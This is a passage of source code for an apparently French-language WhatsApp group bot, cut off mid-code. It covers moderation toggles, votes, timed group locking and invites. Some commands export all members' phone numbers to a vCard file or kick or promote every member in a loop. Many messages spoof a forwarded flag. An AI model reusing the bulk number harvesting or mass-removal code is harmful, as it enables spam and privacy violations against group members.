			case 'add-grosmot': case 'addbd':
               if (!TontonKev) return KevStickOwner()
               if (args.length < 1) return replygckev( `Send la command ${prefix}add-grosmot [gros mot]. Exemple ${prefix}add-grosmot cul`)
               bad.push(q)
               fs.writeFileSync('./recherche/badword.json', JSON.stringify(bad))
               replygckev('Gros mot add avec succes!')
            break
            case 'supp-grosmot': case 'deldb':
               if (!TontonKev) return KevStickOwner()
               if (args.length < 1) return replygckev( `Send commands ${prefix}supp-grosmot [gros mot]. Exemple ${prefix}supp-grosmot cul`)                 
               bad.splice(q)
               fs.writeFileSync('./recherche/badword.json', JSON.stringify(bad))
               replygckev('Gros mot supprimey avec succes !')
            break 
            case 'liste-grosmot':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygckev(teks)
}
break
			case 'anti-grosmot':
            case 'anti-toxic':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].badword = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].badword = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-18':
            case '-18':{
		         if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].ntnsfw = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].ntnsfw = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
			case 'voir-bio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Kev.fetchStatus(who)
    replygckev(bio.status)
  } catch {
    if (text) return replygckev(`bio privee ou ou n'avez pas repondue au message du concerney!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Kev.fetchStatus(who)
      replygckev(bio.status)
    } catch {
      return replygckev(`bio privee ou ou n'avez pas repondue au message du concerney!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return KevStickGroup()
            if (m.chat in vote) return replygckev(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygckev(`Enter Reason for Vote, Example: *${prefix + command} Beautey de tonton Kev*`)
            replygckev(`Debut du vote!\n\n*${prefix}upvote* - pour upvote\n*${prefix}downvote* - pour downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
│➠ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
│➠ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Kev.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygckev('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
│➠ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
│➠ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Kev.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygckev('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
│➠ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
│➠ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            Kev.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return KevStickGroup()
if (!(m.chat in vote)) return replygckev(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
│➠ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
│➠ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `│➠ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Kev.user.id}
`
Kev.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return KevStickGroup()
            if (!(m.chat in vote)) return replygckev(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygckev('Successfully Deleted Vote Session In This Group')
	    }
            break
break
			case 'fermeture':
                if (!m.isGroup) return KevStickGroup()
                if (!m.isAdmin && !TontonKev) return KevStickAdmin()
                if (!m.isBotAdmin) return KevStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygckev('*selectionnez:*\nsecond\nminute\nhour\n\n*Exemple*\n10 second')
                }
                replygckev(`Temps de fermeture ${q} a partir de maintenant`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    Kev.groupSettingUpdate(m.chat, 'announcement')
                    replygckev(close)
                }, timer)
                break
            case 'ouverture':
                if (!m.isGroup) return KevStickGroup()
                if (!m.isAdmin && !TontonKev) return replygckev(mess.admin)
                if (!m.isBotAdmin) return KevStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygckev('*selectionnez:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygckev(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Temps d ouverture* Le groupe a ete ouvert par un admin\n Maintenant meme les randoms peuvent ecrire`
                    Kev.groupSettingUpdate(m.chat, 'not_announcement')
                    replygckev(open)
                }, timer)
                break
			case 'mod-info':{
                if (!m.isGroup) return KevStickGroup()
                if (!m.isAdmin && !TontonKev) return KevStickAdmin()
                if (!m.isBotAdmin) return KevStickBotAdmin()
                if (args[0] === 'open') {
                    await Kev.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygckev(`Info du groupe desormais modifiable par dout le monde`))
                } else if (args[0] === 'close') {
                    await Kev.groupSettingUpdate(m.chat, 'locked').then((res) => replygckev(`Info de groupe restreintes`))
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} open"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} close"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
			case 'voir-contact': case 'voi-con': {
if (!m.isGroup) return KevStickGroup()
if (!(m.isAdmin || TontonKev)) return KevStickAdmin()
kevbigpp = await Kev.sendMessage(m.chat, {
    text: `\nGroupe: *${groupMetadata.subject}*\nMembre: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
Kev.sendContact(m.chat, participants.map(a => a.id), kevbigpp)
}
break
case 'reg-contact': case 'svcontact':{
if (!m.isGroup) return KevStickGroup()
if (!(m.isAdmin || TontonKev)) return KevStickAdmin()
let cmiggc = await Kev.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygckev('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Kev.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'send-contact': case 'sencontact': {
if (!m.isGroup) return KevStickGroup()
if (!m.mentionedJid[0]) return replygckev('\nUsage\n Exemple:.send-contact @tag nom')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Kev.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contact-tag': case 'contag':{
if (!m.isGroup) return KevStickGroup()
if (!(m.isAdmin || TontonKev)) return KevStickAdmin()
if (!m.mentionedJid[0]) return replygckev('\nUsage \n Exemple:.contact-tag @tag|nom')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
Kev.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
			case 'tous-dehors': {
 if (!m.isGroup) return KevStickGroup()
 if (!m.isAdmin && !TontonKev) return KevStickAdmin()
 if (!m.isBotAdmin) return KevStickBotAdmin()
  const kevkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.db.groups[m.chat].welcome === true) {
 global.db.groups[m.chat].welcome = false;
  }
 for (let remove of kevkickall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygckev(`Succes`);
}
break
case 'nominations': {
 if (!m.isGroup) return KevStickGroup()
 if (!m.isAdmin && !TontonKev) return KevStickAdmin()
 if (!m.isBotAdmin) return KevStickBotAdmin()
  const kevpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of kevpromoteall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygckev(`Succes`);
}
break
case 'denominations': {
 if (!m.isGroup) return KevStickGroup()
 if (!m.isAdmin && !TontonKev) return KevStickAdmin()
 if (!m.isBotAdmin) return KevStickBotAdmin()
  const kevdemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of kevdemoteall) {
 await Kev.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygckev(`Succes`);
}
break
			case 'ephemere': {
                if (!m.isGroup) return KevStickGroup()
                if (!m.isBotAdmin) return KevStickBotAdmin()
                if (!m.isAdmin && !TontonKev) return KevStickAdmin()
                if (args[0] === 'on') {
                    await Kev.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygckev(`Effecruey`)
                } else if (args[0] === 'off') {
                    await Kev.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygckev(`Effectuey`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                
            }
            break
			case 'inviter': {
	if (!m.isGroup) return KevStickGroup()
	if (!m.isBotAdmin) return KevStickBotAdmin()
if (!text) return replygckev(`Veuillez entrer le numero que vous souhaitez inviter dans le groupe\n\nExemple :\n*${prefix + command}* 237656774511`)
if (text.includes('+')) return replygckev(`N oubliez pas le *+*`)
if (isNaN(text)) return replygckev(`Entrez juste ke numero sans les espaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await Kev.groupInviteCode(group)
      await Kev.sendMessage(text+'@s.whatsapp.net', {text: `≡ *INVITATIONDE GROUPE*\n\nun utilisateur vous invite a rejoindre le groupe\n\n${link}`, mentions: [m.sender]})
        replygckev(`Une invitation a ete envoyee au concerney`) 
}
break
			case 'tag-admin': case 'liste-admin': case 'admin':{
    	if (!m.isGroup) return KevStickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Groupe D Admins:*
${listAdmin}
`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: text
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Menu 🚀\",\"id\":\"${prefix}menu"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [...groupAdmins.map(v => v.id), owner],
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
   
}
break
			case 'lien-groupe':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':{
                if (!m.isGroup) return KevStickGroup()
                if (!m.isAdmin && !isGroupOwner && !TontonKev) return KevStickAdmin()
                if (!m.isBotAdmin) return KevStickBotAdmin()
                let response = await Kev.groupInviteCode(m.chat)
                Kev.sendText(m.chat, `👥 *LIEN DU GROUPE*\n📛 *Nom :* ${groupMetadata.subject}\n👤 *Proprio Du Groupe :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Lien :* https://chat.whatsapp.com/${response}\n👥 *Membre :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                }
            break
			case 'anti-poll':{
            	if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antipoll = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antipoll = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-sticker':{
            	if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antisticker = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antisticker = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"sections":[{"title":"SELECTIONNEZ ACTIVER/DESACTIVER",
"rows":[{"header":"ACTIVER✅",
"title":"SELECTION ",
"description":"ACTIVER✅",
"id":"${prefix+command} on"},
{"header":"DESACTIVER❌",
"title":"SELECTION ",
"description":"DESACTIVER❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Kev.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anti-image':{
            	if (!m.isGroup) return KevStickGroup()
if (!m.isBotAdmin) return KevStickBotAdmin()
if (!m.isAdmin && !TontonKev) return KevStickAdmin()
               
               if (args[0] === 'on') {
                  db.groups[m.chat].antiimage = true
                  replygckev(`${command} activey`)
               } else if (args[0] === 'off') {
                  db.groups[m.chat].antiimage = false
                  replygckev(`${command} desactivey`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\nVeuillez cliquer sur le bouton ci-dessous pour utiliser la commande  _*${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./KevFile/theme/sylvers.jpg')}, { upload: Kev.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
